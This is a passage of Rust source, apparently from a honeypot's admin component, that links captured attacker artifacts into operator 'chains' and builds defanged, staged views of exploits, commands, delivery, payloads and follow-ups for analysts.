//! Chains: groups of joiner pieces ([`super::pieces`]) one operator is
//! behind. A sighting with the role `stager`, `key` or `file` is a joiner
//! (the role, not the kind: every URL piece has the kind `stager`). Two
//! joiners connect only when they appear together in sources from at least
//! two addresses, so one forged body naming two stagers fuses nothing, and a
//! shared recipe or one address using both connects nothing. A joiner that
//! connects to none is a chain of its own.
//!
//! A chain's sources are the sources holding one of its joiners, and its
//! describers the ones sighted in those sources. What came after an upload
//! is tied through the file ([`follow_ups`], [`dead_ends`]), never through
//! the address, so a noisy scanner cannot fill a chain.
//!
//! Derived on each node from its sightings, rebuilt in the campaign pass
//! ([`plan`] in its read snapshot, [`store_plan`] in its write transaction),
//! never replicated, never exported.
//!
//! [`Store::chains_of`] is the only way views read a chain: from a request,
//! an upload, an address, a campaign or a piece, always as the same five
//! [`Stage`]s. It reads upload metadata, never upload content.
use super::Store;
use super::browse::{PAGE_SIZE, Page, offset};
use super::campaigns::HARD_FANOUT_MAX;
use super::pieces::PieceResult;
use super::uploads::{self, HELD_TEXT, TimelineRow, UPLOAD_COLS, UploadRow};
use crate::admin::views::link_href;
use crate::model::defang::defang;
use crate::model::xray::key::{holds_key, masked};
use crate::model::xray::{LayerKind, Policy, Source, Xray, parse};
use crate::trap::decoy::keeps_its_own_answer;
use anyhow::Result;
use sqlx::SqliteConnection;
use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};

/// Stored with each chain; a new version rebuilds them.
pub const CHAIN_V: i64 = 1;

const REQUEST: u8 = 0;
const UPLOAD: u8 = 1;

/// The roles that join, for a `role IN` clause.
const JOINER_ROLES: &str = "('stager', 'key', 'file')";
/// The kinds that describe.
const DESCRIBER_KINDS: &str = "('exploit', 'recipe', 'tag', 'shell-profile')";

/// Most joiners a source may name and still connect them. A body can name
/// 256 pieces, so 32,640 pairs; no real source names this many, so a source
/// over it costs no pair. Its joiners stay chains, it just joins none.
const PAIRED_JOINERS_MAX: usize = 64;
/// Rows per `INSERT`: well under SQLite's bound variables.
const INSERT_BATCH: usize = 400;

/// Most uploads of a chain [`follow_ups`] and [`dead_ends`] read, newest
/// first: each is a query, and a botnet's chain can hold thousands.
const UPLOADS_MAX: i64 = 64;
/// A dead end: asked for within this long after the upload.
const DEAD_END_SECS: i64 = 60;

/// Most uploads whose timelines and dead ends a chain reads, newest first.
const TIMELINE_UPLOADS: usize = 8;
/// Most follow-ups a chain reads through the X-ray, in order. The rest are
/// counted.
const FOLLOW_READS_MAX: usize = 32;
/// Most pieces a chain shows, joiners first. The rest are counted.
const FOUND_MAX: usize = 200;
/// Newest sources a chain pairs its exploits and tags in.
const TAG_SOURCES_MAX: i64 = 2000;

/// Most chains [`Store::chains_of`] builds: one forged body can name 256
/// stagers, each its own chain.
const CHAINS_MAX: usize = 32;
/// Most sources a chain of one shared describer reads, newest first.
const SHARED_SOURCES_MAX: i64 = 500;
/// The roles a strip shows. Queried and self-hosted URLs never appear.
const STRIP_ROLES: &str = "('exploit', 'tag', 'recipe', 'stager', 'key', 'file')";
/// Longest label, in characters: a recipe can be 512 bytes.
const LABEL_MAX: usize = 160;
/// Sandbox results one chain shows.
const CHAIN_RESULTS_MAX: i64 = 64;
/// Paths an Exploit row lists.
const ROW_PATHS_MAX: usize = 6;

/// A joiner in a source. `source` is the kind ([`REQUEST`] or [`UPLOAD`])
/// and the row's id.
pub struct JoinerSighting {
    piece: i64,
    source: (u8, i64),
    ip: i64,
    ts: String,
}

/// A chain as [`connect`] finds it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ChainOut {
    /// The oldest joiner's hash, as 16 lowercase hex digits. It stays as a
    /// chain grows with newer joiners, but it changes when two chains merge
    /// or an older sighting arrives: views must not treat it as permanent.
    key: String,
    first_seen: String,
    last_seen: String,
    ips: i64,
    /// Every source holding one of its joiners, in order.
    sources: Vec<(u8, i64)>,
    /// In order.
    joiners: Vec<i64>,
}

/// The root of `x`'s group. A root has no entry in `parent`.
fn find(parent: &mut HashMap<i64, i64>, x: i64) -> i64 {
    let mut root = x;
    while let Some(&up) = parent.get(&root) {
        root = up;
    }
    let mut at = x;
    while at != root {
        at = parent.insert(at, root).unwrap_or(root);
    }
    root
}

/// The joiner pairs that appear together in sources from at least two
/// addresses, as a union of everything each joins: `piece -> parent`.
fn unions(sightings: &[JoinerSighting]) -> HashMap<i64, i64> {
    let mut sources: HashMap<(u8, i64), (i64, BTreeSet<i64>)> = HashMap::new();
    let mut addresses: HashMap<i64, HashSet<i64>> = HashMap::new();
    for s in sightings {
        let (_, joiners) = sources
            .entry(s.source)
            .or_insert_with(|| (s.ip, BTreeSet::new()));
        joiners.insert(s.piece);
        addresses.entry(s.piece).or_default().insert(s.ip);
    }
    let mut parent = HashMap::new();
    // A joiner on one address cannot connect, and an address sending the
    // same list again says nothing new: neither costs a pair.
    let mut read: HashSet<(i64, Vec<i64>)> = HashSet::new();
    // The first address of each pair: a second one connects it.
    let mut pairs: HashMap<(i64, i64), i64> = HashMap::new();
    for (ip, joiners) in sources.into_values() {
        if joiners.len() > PAIRED_JOINERS_MAX {
            continue;
        }
        let shared: Vec<i64> = joiners
            .into_iter()
            .filter(|j| addresses[j].len() >= 2)
            .collect();
        if shared.len() < 2 || !read.insert((ip, shared.clone())) {
            continue;
        }
        for (i, &a) in shared.iter().enumerate() {
            for &b in &shared[i + 1..] {
                if *pairs.entry((a, b)).or_insert(ip) != ip {
                    let (ra, rb) = (find(&mut parent, a), find(&mut parent, b));
                    if ra != rb {
                        parent.insert(ra, rb);
                    }
                }
            }
        }
    }
    parent
}

/// The chains these joiners form, by key.
pub(crate) fn connect(sightings: &[JoinerSighting]) -> Vec<ChainOut> {
    #[derive(Default)]
    struct Group<'a> {
        /// Each joiner's oldest sighting.
        joiners: BTreeMap<i64, &'a str>,
        ips: HashSet<i64>,
        sources: BTreeSet<(u8, i64)>,
        first: &'a str,
        last: &'a str,
    }
    let mut parent = unions(sightings);
    let mut groups: HashMap<i64, Group> = HashMap::new();
    for s in sightings {
        let g = groups.entry(find(&mut parent, s.piece)).or_default();
        let oldest = g.joiners.entry(s.piece).or_insert(&s.ts);
        *oldest = (*oldest).min(&s.ts);
        g.ips.insert(s.ip);
        g.sources.insert(s.source);
        if g.first.is_empty() || s.ts.as_str() < g.first {
            g.first = &s.ts;
        }
        g.last = g.last.max(&s.ts);
    }
    let mut out: Vec<ChainOut> = groups
        .into_values()
        .map(|g| {
            let oldest = g
                .joiners
                .iter()
                .min_by_key(|&(hash, ts)| (*ts, *hash))
                .map_or(0, |(hash, _)| *hash);
            ChainOut {
                key: format!("{:016x}", oldest as u64),
                first_seen: g.first.to_string(),
                last_seen: g.last.to_string(),
                ips: g.ips.len() as i64,
                sources: g.sources.into_iter().collect(),
                joiners: g.joiners.into_keys().collect(),
            }
        })
        .collect();
    out.sort_by(|a, b| a.key.cmp(&b.key));
    out
}

fn source_of(kind: &str, id: i64) -> (u8, i64) {
    (if kind == "upload" { UPLOAD } else { REQUEST }, id)
}

/// The joiner sightings chains are built from. A file on more than
/// [`HARD_FANOUT_MAX`] addresses is left out: it is a public webshell, not
/// an operator. Counted from the sightings, as `pieces.ips` can lag.
async fn joiner_sightings(tx: &mut SqliteConnection) -> Result<Vec<JoinerSighting>> {
    let rows: Vec<(i64, String, i64, i64, String)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT piece, source_kind, source_id, ip_id, ts FROM piece_sightings
             WHERE role IN {JOINER_ROLES} AND piece NOT IN
               (SELECT piece FROM piece_sightings WHERE role = 'file'
                GROUP BY piece HAVING COUNT(DISTINCT ip_id) > ?)"
    )))
    .bind(HARD_FANOUT_MAX as i64)
    .fetch_all(&mut *tx)
    .await?;
    Ok(rows
        .into_iter()
        .map(|(piece, kind, id, ip, ts)| JoinerSighting {
            piece,
            source: source_of(&kind, id),
            ip,
            ts,
        })
        .collect())
}

/// What a pass will store.
pub struct Plan {
    chains: Vec<ChainOut>,
    /// Index into `chains`, and a piece: its joiners and describers.
    members: Vec<(usize, i64)>,
}

/// Read the sightings and work out the chains, in memory. Called in the
/// pass's read snapshot, so the write lock is not held for any of this.
pub async fn plan(conn: &mut SqliteConnection) -> Result<Plan> {
    let chains = connect(&joiner_sightings(conn).await?);
    let mut holders: HashMap<(u8, i64), Vec<usize>> = HashMap::new();
    let mut members: BTreeSet<(usize, i64)> = BTreeSet::new();
    for (i, c) in chains.iter().enumerate() {
        for &source in &c.sources {
            holders.entry(source).or_default().push(i);
        }
        members.extend(c.joiners.iter().map(|&j| (i, j)));
    }
    let describers: Vec<(i64, String, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT DISTINCT g.piece, g.source_kind, g.source_id
         FROM piece_sightings g JOIN pieces p ON p.hash = g.piece
         WHERE p.kind IN {DESCRIBER_KINDS} AND EXISTS
           (SELECT 1 FROM piece_sightings j
            WHERE j.source_kind = g.source_kind AND j.source_id = g.source_id
              AND j.role IN {JOINER_ROLES})"
    )))
    .fetch_all(&mut *conn)
    .await?;
    for (piece, kind, id) in describers {
        for &i in holders.get(&source_of(&kind, id)).into_iter().flatten() {
            members.insert((i, piece));
        }
    }
    Ok(Plan {
        chains,
        members: members.into_iter().collect(),
    })
}

/// `n` rows of `row`, for a `VALUES` clause.
fn values(row: &str, n: usize) -> String {
    vec![row; n].join(",")
}

/// Replace every chain with `plan`: only writes, in the transaction that
/// rebuilds the campaigns.
pub async fn store_plan(tx: &mut SqliteConnection, plan: &Plan) -> Result<()> {
    for sql in ["DELETE FROM chain_pieces", "DELETE FROM chains"] {
        sqlx::query(sql).execute(&mut *tx).await?;
    }
    for batch in plan.chains.chunks(INSERT_BATCH) {
        let sql = format!(
            "INSERT INTO chains (key, first_seen, last_seen, ips, sources, v) VALUES {}",
            values("(?,?,?,?,?,?)", batch.len())
        );
        let mut q = sqlx::query(sqlx::AssertSqlSafe(sql));
        for c in batch {
            q = q
                .bind(&c.key)
                .bind(&c.first_seen)
                .bind(&c.last_seen)
                .bind(c.ips)
                .bind(c.sources.len() as i64)
                .bind(CHAIN_V);
        }
        q.execute(&mut *tx).await?;
    }
    for batch in plan.members.chunks(INSERT_BATCH) {
        let sql = format!(
            "INSERT INTO chain_pieces (chain, piece) VALUES {}",
            values("(?,?)", batch.len())
        );
        let mut q = sqlx::query(sqlx::AssertSqlSafe(sql));
        for &(i, piece) in batch {
            q = q.bind(&plan.chains[i].key).bind(piece);
        }
        q.execute(&mut *tx).await?;
    }
    Ok(())
}

/// The uploads holding one of the chain's joiners, newest first, at most
/// [`UPLOADS_MAX`].
pub async fn uploads_of(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<UploadRow>> {
    Ok(sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT {UPLOAD_COLS} WHERE u.id IN
           (SELECT g.source_id FROM chain_pieces c JOIN pieces p ON p.hash = c.piece
            JOIN piece_sightings g ON g.piece = c.piece
            WHERE c.chain = ? AND g.source_kind = 'upload' AND g.role IN {JOINER_ROLES})
         ORDER BY u.id DESC LIMIT ?"
    )))
    .bind(chain)
    .bind(UPLOADS_MAX)
    .fetch_all(&mut *conn)
    .await?)
}

/// What was sent to the chain's files, oldest first, at most
/// [`uploads::TIMELINE_MAX`]: the timelines of its newest
/// [`TIMELINE_UPLOADS`] uploads, from any address,
/// without the requests to a path the trap answers itself. Until `411e2a6`
/// a `PUT /` or `PUT /.env` made that path answer as a webshell for everyone,
/// so those rows, `webshell` or not, are ordinary traffic and stay out.
pub async fn follow_ups(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<TimelineRow>> {
    let uploads = uploads_of(conn, chain).await?;
    follow_ups_of(conn, &uploads).await
}

/// [`follow_ups`] of these uploads.
async fn follow_ups_of(
    conn: &mut SqliteConnection,
    uploads: &[UploadRow],
) -> Result<Vec<TimelineRow>> {
    let newest = &uploads[..uploads.len().min(TIMELINE_UPLOADS)];
    let mut rows = BTreeMap::new();
    for r in uploads::timelines(conn, newest).await? {
        if !keeps_its_own_answer(&r.method, &r.path, r.query.as_deref()) {
            rows.insert((r.ts.clone(), r.id), r);
        }
    }
    let rows = rows.into_values();
    Ok(rows.take(uploads::TIMELINE_MAX as usize).collect())
}

/// The name a client would ask for the file by: the one it sent, without
/// directories, or for a `PUT`, which sends none, the end of the path.
fn file_name(u: &UploadRow) -> Option<&str> {
    let sent = u.filename.as_deref().filter(|f| !f.is_empty());
    let name = sent.unwrap_or(&u.answered_path);
    name.rsplit(['/', '\\']).next().filter(|n| !n.is_empty())
}

/// The dead ends of the chain's files, oldest first, at most
/// [`uploads::TIMELINE_MAX`], from its newest [`TIMELINE_UPLOADS`] uploads.
pub async fn dead_ends(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<TimelineRow>> {
    let uploads = uploads_of(conn, chain).await?;
    dead_ends_for(conn, &uploads).await
}

/// The requests that found nothing where an upload was expected: the same
/// address, within [`DEAD_END_SECS`] after the upload, asks the same origin
/// for a path ending in the file's name and gets a 404. `substr`, not
/// `LIKE`: a `_` or `%` in the name is no wildcard. One statement, with a
/// limit per upload.
async fn dead_ends_for(
    conn: &mut SqliteConnection,
    uploads: &[UploadRow],
) -> Result<Vec<TimelineRow>> {
    let newest = &uploads[..uploads.len().min(TIMELINE_UPLOADS)];
    let named: Vec<(&UploadRow, String)> = newest
        .iter()
        .filter_map(|u| file_name(u).map(|n| (u, format!("/{n}"))))
        .collect();
    if named.is_empty() {
        return Ok(vec![]);
    }
    let one = "SELECT * FROM (
         SELECT r.id, r.ts, i.ip, r.method, r.path, r.query, r.status, r.answer
         FROM requests r JOIN ips i ON i.id = r.ip_id
         WHERE i.ip = ? AND r.origin IS ? AND r.status = 404
           AND substr(r.path, -length(?)) = ?
           AND r.ts <= datetime(?, ?)
           AND (r.ts > ? OR (r.ts = ? AND r.id > ?))
         ORDER BY r.ts, r.id LIMIT ?)";
    let sql = vec![one; named.len()].join(" UNION ALL ");
    let mut q = sqlx::query_as::<_, TimelineRow>(sqlx::AssertSqlSafe(sql));
    for (u, name) in &named {
        q = q
            .bind(&u.ip)
            .bind(&u.origin)
            .bind(name)
            .bind(name)
            .bind(&u.ts)
            .bind(format!("+{DEAD_END_SECS} seconds"))
            .bind(&u.ts)
            .bind(&u.ts)
            .bind(u.request_id.unwrap_or(i64::MAX))
            .bind(uploads::TIMELINE_MAX);
    }
    let mut rows = BTreeMap::new();
    for r in q.fetch_all(&mut *conn).await? {
        rows.insert((r.ts.clone(), r.id), r);
    }
    let rows = rows.into_values();
    Ok(rows.take(uploads::TIMELINE_MAX as usize).collect())
}

/// What a chain is read from.
#[derive(Debug, Clone, Copy)]
pub enum Anchor<'a> {
    /// A request, with the uploads it carried.
    Request(i64),
    /// An upload by uid, with the request that carried it.
    Upload(&'a str),
    /// An address's id.
    Ip(i64),
    /// A campaign's key.
    Campaign(&'a str),
    /// A piece's hash.
    Piece(i64),
}

/// How far a row is confirmed. Pages show [`Mark::word`] as well as a line
/// style, so it never rests on the look alone.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mark {
    /// The trap received or held it.
    Seen,
    /// The attacker's text says so; nothing confirmed it.
    Claimed,
    /// An operator entered it from outside analysis.
    External,
    /// Nothing is known here.
    Gap,
    /// The trap stopped the chain here.
    DeadEnd,
}

impl Mark {
    pub fn word(self) -> &'static str {
        match self {
            Mark::Seen => "seen",
            Mark::Claimed => "claimed",
            Mark::External => "external",
            Mark::Gap => "gap",
            Mark::DeadEnd => "dead end",
        }
    }

    /// Its CSS class.
    pub fn class(self) -> &'static str {
        match self {
            Mark::Seen => "seen",
            Mark::Claimed => "claimed",
            Mark::External => "external",
            Mark::Gap => "gap",
            Mark::DeadEnd => "dead-end",
        }
    }
}

/// One row of a stage. `label` and `detail` are defanged and still attacker
/// text: pages escape them, and only `href`, always one of ours, is a link.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct StageRow {
    pub piece: Option<i64>,
    pub label: String,
    pub detail: String,
    pub mark: Mark,
    /// It ties this chain together.
    pub joiner: bool,
    /// It belongs to the anchor.
    pub here: bool,
    /// The anchor is a source, and did not use this stage.
    pub dim: bool,
    pub href: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Stage {
    pub name: &'static str,
    pub rows: Vec<StageRow>,
}

/// A chain as views read it. `key` is `None` for what has no joiner: one
/// source's own pieces, or the sources sharing a describer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Chain {
    pub key: Option<String>,
    /// `Exploit`, `Command`, `Delivery`, `Payload`, `Follow-up`.
    pub stages: [Stage; 5],
    pub ips: i64,
    pub sources: i64,
    pub first_seen: String,
    pub last_seen: String,
    /// Pieces past [`FOUND_MAX`], in no stage.
    pub more: i64,
}

impl Chain {
    /// The joiner that names it: the oldest, whose hash is the key.
    fn name_row(&self) -> Option<&StageRow> {
        let rows = &self.stages[2].rows;
        let oldest = self.key.as_deref().and_then(key_piece);
        rows.iter()
            .find(|r| r.joiner && r.piece == oldest)
            .or_else(|| rows.iter().find(|r| r.joiner))
    }

    /// What pages call it.
    pub fn title(&self) -> String {
        self.name_row()
            .map_or_else(|| "no joiner".to_string(), |r| r.label.clone())
    }

    /// Where it has its page: its joiner's.
    pub fn href(&self) -> Option<&str> {
        self.name_row().and_then(|r| r.href.as_deref())
    }
}

/// The piece a chain's key names.
fn key_piece(key: &str) -> Option<i64> {
    u64::from_str_radix(key, 16).ok().map(|h| h as i64)
}

/// What a row belongs to, for its `here` and `dim`.
#[derive(Default)]
struct Here {
    pieces: HashSet<i64>,
    requests: HashSet<i64>,
    uploads: HashSet<String>,
    /// A source: stages it did not use are dimmed.
    dim: bool,
}

/// A piece in a chain, in one role.
#[derive(sqlx::FromRow)]
struct Found {
    hash: i64,
    kind: String,
    value: String,
    role: String,
    seen: bool,
    ips: i64,
}

impl Found {
    fn mark(&self) -> Mark {
        if self.seen { Mark::Seen } else { Mark::Claimed }
    }

    /// Its page under Links, for the kinds that have one.
    fn href(&self) -> Option<String> {
        let kind = match self.kind.as_str() {
            "stager" | "key" | "file" | "recipe" => self.kind.as_str(),
            "tag" => "exploit-tag",
            _ => return None,
        };
        Some(link_href(kind, &self.value))
    }

    fn on_addresses(&self, what: &str) -> String {
        if self.ips > 0 {
            format!("{what} · {}", count(self.ips, "address", "addresses"))
        } else {
            what.to_string()
        }
    }
}

fn count(n: i64, one: &str, many: &str) -> String {
    format!("{n} {}", if n == 1 { one } else { many })
}

/// `s` as a label: defanged, and cut to [`LABEL_MAX`].
fn label(s: &str) -> String {
    let shown = defang(s);
    match shown.char_indices().nth(LABEL_MAX) {
        Some((end, _)) => format!("{}…", &shown[..end]),
        None => shown,
    }
}

fn row(label: String, detail: String, mark: Mark) -> StageRow {
    StageRow {
        piece: None,
        label,
        detail,
        mark,
        joiner: false,
        here: false,
        dim: false,
        href: None,
    }
}

fn piece_row(p: &Found, detail: String, here: &Here) -> StageRow {
    StageRow {
        piece: Some(p.hash),
        here: here.pieces.contains(&p.hash),
        href: p.href(),
        ..row(label(&p.value), detail, p.mark())
    }
}

/// An attacker's tag up to its first dot, so `cve_2024_4577.selfrep` reads
/// with `cve_2024_4577`.
fn tag_stem(tag: &str) -> &str {
    tag.split('.')
        .next()
        .filter(|t| !t.is_empty())
        .unwrap_or(tag)
}

/// The Exploit stage: a row per tag stem, listing the paths sent with it,
/// then a row per exploit sent with no tag. `tags` holds an exploit's hash
/// and a tag's, for each that shared a source.
fn exploit_rows(found: &[Found], tags: &[(i64, i64)], here: &Here) -> Vec<StageRow> {
    let by_role = |role: &'static str| {
        let found = found.iter().filter(move |p| p.role == role);
        found.map(|p| (p.hash, p)).collect::<BTreeMap<_, _>>()
    };
    let (exploits, tag_pieces) = (by_role("exploit"), by_role("tag"));
    let mut stems: BTreeMap<&str, (Vec<&Found>, BTreeSet<&str>, bool)> = BTreeMap::new();
    for p in tag_pieces.values() {
        stems.entry(tag_stem(&p.value)).or_default().0.push(p);
    }
    let mut tagged = HashSet::new();
    for (exploit, tag) in tags {
        let (Some(e), Some(t)) = (exploits.get(exploit), tag_pieces.get(tag)) else {
            continue;
        };
        tagged.insert(e.hash);
        let stem = stems.entry(tag_stem(&t.value)).or_default();
        stem.1.insert(&e.value);
        stem.2 |= here.pieces.contains(&e.hash);
    }
    let mut rows = vec![];
    for (stem, (mut tags, paths, used)) in stems {
        tags.sort_by(|a, b| a.value.cmp(&b.value));
        let mut listed: Vec<String> = paths.iter().take(ROW_PATHS_MAX).map(|p| label(p)).collect();
        if paths.len() > ROW_PATHS_MAX {
            listed.push(format!("{} more", paths.len() - ROW_PATHS_MAX));
        }
        let mut detail = "attacker's tag".to_string();
        if !listed.is_empty() {
            detail = format!("{detail} · {}", listed.join(", "));
        }
        let mut r = piece_row(tags[0], detail, here);
        r.label = label(stem);
        r.here = used || tags.iter().any(|t| here.pieces.contains(&t.hash));
        rows.push(r);
    }
    let bare = exploits.values().filter(|e| !tagged.contains(&e.hash));
    rows.extend(bare.map(|e| piece_row(e, e.on_addresses("no tag"), here)));
    rows
}

/// The Command stage: recipes, and what a webshell runs.
fn command_rows(found: &[Found], here: &Here) -> Vec<StageRow> {
    let recipes = found.iter().filter(|p| p.role == "recipe").map(|p| {
        let what = match p.kind.as_str() {
            "recipe" => "shell recipe",
            _ => "webshell profile",
        };
        piece_row(p, p.on_addresses(what), here)
    });
    recipes.collect()
}

/// The Delivery stage: stagers, keys and uploaded files, by role only, so a
/// URL that was merely queried stays out.
fn delivery_rows(
    key: Option<&str>,
    found: &[Found],
    uploads: &[UploadRow],
    here: &Here,
) -> Vec<StageRow> {
    let mut rows = vec![];
    for (role, what) in [
        ("stager", "stager"),
        ("key", "SSH key"),
        ("file", "uploaded file"),
    ] {
        for p in found.iter().filter(|p| p.role == role) {
            let name = uploads
                .iter()
                .find(|u| role == "file" && u.hash() == p.value);
            let name = name.and_then(|u| u.filename.as_deref());
            let mut r = piece_row(p, p.on_addresses(what), here);
            r.joiner = key.is_some();
            if let Some(name) = name {
                r.label = label(name);
            } else if role == "file" {
                r.label = label(p.value.get(..12).unwrap_or(&p.value));
            }
            rows.push(r);
        }
    }
    rows
}

/// The Payload stage: the uploaded text as seen, one row per content, else
/// a gap that points to where a result is entered. Sandbox results belong
/// here too: this is the one place that decides the stage.
fn payload_rows(
    found: &[Found],
    uploads: &[UploadRow],
    results: &[PieceResult],
    here: &Here,
) -> Vec<StageRow> {
    let mut contents: BTreeMap<Vec<u8>, Vec<&UploadRow>> = BTreeMap::new();
    for u in uploads.iter().filter(|u| u.held_text()) {
        contents.entry(u.sha256.clone()).or_default().push(u);
    }
    let mut groups: Vec<_> = contents.into_values().collect();
    groups.sort_by(|a, b| b[0].ts.cmp(&a[0].ts));
    let rows: Vec<StageRow> = groups
        .into_iter()
        .map(|same| {
            let u = same[0];
            let name = u.filename.as_deref().unwrap_or(&u.answered_path);
            let piece = found
                .iter()
                .find(|p| p.role == "file" && p.value == u.hash());
            StageRow {
                piece: piece.map(|p| p.hash),
                here: same.iter().any(|u| here.uploads.contains(&u.uid))
                    || piece.is_some_and(|p| here.pieces.contains(&p.hash)),
                href: Some(format!(
                    "/admin/traps/uploads/{}",
                    crate::admin::public::urlencode(&u.uid)
                )),
                ..row(
                    label(name),
                    format!(
                        "uploaded text · {} · {}",
                        count(u.size, "byte", "bytes"),
                        count(same.len() as i64, "upload", "uploads")
                    ),
                    Mark::Seen,
                )
            }
        })
        .collect();
    let mut rows = rows;
    rows.extend(results.iter().map(|r| result_row(r, found, here)));
    if !rows.is_empty() {
        return rows;
    }
    let stager = found.iter().find(|p| p.role == "stager");
    let target = stager.or_else(|| found.iter().find(|p| p.role == "file"));
    let detail = match target {
        Some(_) => "Nothing here fetches it. A sandbox's result goes on this page.",
        None => "No stager named and no text uploaded.",
    };
    vec![StageRow {
        piece: target.map(|p| p.hash),
        href: target.and_then(Found::href),
        ..row("No payload seen".into(), detail.into(), Mark::Gap)
    }]
}

/// An admin's sandbox result, as a row: external, not seen here.
fn result_row(r: &PieceResult, found: &[Found], here: &Here) -> StageRow {
    let name = match (&r.family, &r.sha256) {
        (Some(f), _) => f.clone(),
        (None, Some(h)) => format!("sha256 {}", h.get(..12).unwrap_or(h)),
        _ => "sandbox result".to_string(),
    };
    let mut detail = String::from("external · sandbox result");
    if r.family.is_some()
        && let Some(h) = &r.sha256
    {
        detail.push_str(&format!(" · sha256 {}", h.get(..12).unwrap_or(h)));
    }
    let on = found.iter().find(|p| p.hash == r.piece);
    StageRow {
        piece: Some(r.piece),
        here: here.pieces.contains(&r.piece),
        href: on.and_then(Found::href),
        ..row(label(&name), detail, Mark::External)
    }
}

/// The results entered for the stagers and files of a chain, oldest first.
async fn results_of(conn: &mut SqliteConnection, found: &[Found]) -> Result<Vec<PieceResult>> {
    let hashes: BTreeSet<i64> = found
        .iter()
        .filter(|p| matches!(p.kind.as_str(), "stager" | "file"))
        .map(|p| p.hash)
        .collect();
    if hashes.is_empty() {
        return Ok(vec![]);
    }
    // Integers, so they go in the text.
    let ids = hashes
        .iter()
        .map(i64::to_string)
        .collect::<Vec<_>>()
        .join(",");
    Ok(sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT piece, id, sha256, family, source_url, note, added_by, added_at
         FROM piece_results WHERE piece IN ({ids}) ORDER BY added_at, piece, id LIMIT ?"
    )))
    .bind(CHAIN_RESULTS_MAX)
    .fetch_all(&mut *conn)
    .await?)
}

/// One row per distinct `shown`, in order, with how often it came.
fn request_rows(
    requests: &[TimelineRow],
    shown: impl Fn(&TimelineRow) -> String,
    detail: impl Fn(&TimelineRow, i64) -> String,
    mark: Mark,
    here: &Here,
) -> Vec<StageRow> {
    let mut sent: Vec<(&TimelineRow, String, i64, bool)> = vec![];
    let mut at = HashMap::new();
    for r in requests {
        let text = shown(r);
        let i = *at
            .entry((text.clone(), &r.method, &r.path))
            .or_insert(sent.len());
        if i == sent.len() {
            sent.push((r, text, 0, false));
        }
        sent[i].2 += 1;
        sent[i].3 |= here.requests.contains(&r.id);
    }
    let rows = sent.into_iter().map(|(r, text, n, used)| StageRow {
        here: used,
        href: Some(format!("/admin/requests/{}", r.id)),
        ..row(text, detail(r, n), mark)
    });
    rows.collect()
}

/// What came after a chain's uploads.
#[derive(Default)]
struct FollowUps {
    dead: Vec<TimelineRow>,
    /// Read through the X-ray, in order, at most [`FOLLOW_READS_MAX`].
    sent: Vec<TimelineRow>,
    /// What each of `sent` runs, by id, where the X-ray could tell.
    reads: HashMap<i64, String>,
    /// Past `sent`: counted, not read.
    unread: i64,
}

/// A follow-up as the X-ray reads it.
struct Sent {
    id: i64,
    ip: String,
    method: String,
    path: String,
    query: Option<String>,
    body: Option<Vec<u8>>,
}

/// The inputs a chain's webshells read, from their profiles.
fn shell_inputs(found: &[Found]) -> Vec<String> {
    let profiles = found.iter().filter(|p| p.kind == "shell-profile");
    let lists = profiles.filter_map(|p| p.value.split(';').find_map(|f| f.strip_prefix("input=")));
    let inputs: BTreeSet<&str> = lists.flat_map(|l| l.split(',')).collect();
    inputs.into_iter().map(str::to_string).collect()
}

/// `bytes` as one line of text, if there is any.
fn one_line(bytes: &[u8]) -> Option<String> {
    let text = String::from_utf8_lossy(bytes);
    let text = text.replace(char::is_control, " ");
    Some(text.trim().to_string()).filter(|t| !t.is_empty())
}

/// What `r` hands the input a webshell reads, like `$_GET[cmd]` or
/// `php://input`. Other inputs, such as a header, are not stored here.
fn input_value(x: &Xray, r: &Sent, input: &str) -> Option<String> {
    let body = r.body.as_deref().unwrap_or_default();
    if input == "php://input" {
        return one_line(body);
    }
    let (source, name) = input
        .strip_prefix("$_")?
        .strip_suffix(']')?
        .split_once('[')?;
    let field = |text: &[u8]| {
        let fields = serde_urlencoded::from_bytes::<Vec<(String, String)>>(text);
        let fields = fields.unwrap_or_default().into_iter();
        fields
            .filter(|(k, _)| k == name)
            .find_map(|(_, v)| one_line(v.as_bytes()))
    };
    let query = r.query.as_deref().unwrap_or_default().as_bytes();
    let from_query = || {
        matches!(source, "GET" | "REQUEST")
            .then(|| field(query))
            .flatten()
    };
    let from_body = || {
        let posted = matches!(source, "POST" | "REQUEST");
        let part = || {
            let parts = x
                .layers
                .iter()
                .filter(|l| l.kind == LayerKind::MultipartField);
            parts
                .filter(|l| l.name.as_deref() == Some(name.as_bytes()))
                .find_map(|l| one_line(&l.text))
        };
        posted.then(|| field(body).or_else(part)).flatten()
    };
    from_query().or_else(from_body)
}

/// What a follow-up runs: the literal command a shell's input received, or
/// the recipe the X-ray found. A request holding a private key shows only
/// its recipe, which has no literal text in it.
fn read_sent(r: &Sent, inputs: &[String]) -> Option<String> {
    let x = parse(
        Source::Request {
            method: &r.method,
            path: &r.path,
            query: r.query.as_deref(),
            body: r.body.as_deref(),
            sender: Some(&r.ip),
        },
        Policy::embedded(),
    );
    let key = holds_key(&x);
    let command = || inputs.iter().find_map(|i| input_value(&x, r, i));
    let literal = if key { None } else { command() };
    let recipe = || {
        x.recipes
            .iter()
            .map(|l| l.normal.clone())
            .find(|n| !n.is_empty())
    };
    let withheld = || key.then(|| format!("{} [private key withheld]", r.method));
    literal.or_else(recipe).or_else(withheld)
}

/// What came after these uploads, the first [`FOLLOW_READS_MAX`] follow-ups
/// read through the X-ray off the async threads. A request that carried an
/// upload is read without its body: that is upload content.
async fn gather_follow_ups(
    conn: &mut SqliteConnection,
    uploads: &[UploadRow],
    found: &[Found],
) -> Result<FollowUps> {
    let dead = dead_ends_for(conn, uploads).await?;
    let stopped: HashSet<i64> = dead.iter().map(|r| r.id).collect();
    let mut sent = follow_ups_of(conn, uploads).await?;
    sent.retain(|r| !stopped.contains(&r.id));
